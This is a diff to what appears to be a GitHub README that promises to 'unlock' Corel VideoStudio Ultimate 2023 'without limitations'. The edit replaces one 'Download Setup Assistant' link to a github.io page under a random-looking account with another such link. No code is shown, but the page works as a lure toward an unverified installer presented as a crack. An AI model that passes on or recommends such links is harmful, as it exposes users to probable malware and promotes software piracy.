@@ -3,7 +3,7 @@
 A powerful offline solution for unlocking the full potential of Corel VideoStudio Ultimate 2023. Gain access to advanced editing tools, cinematic transitions, animated overlays, and export functionality — without limitations or internet requirements.
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://coreybeasleysrui.github.io/.github/videostudio-ultimate-feature)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://levigreerloxj.github.io/.github/videostudio-ultimate-feature)
 
 ---
 
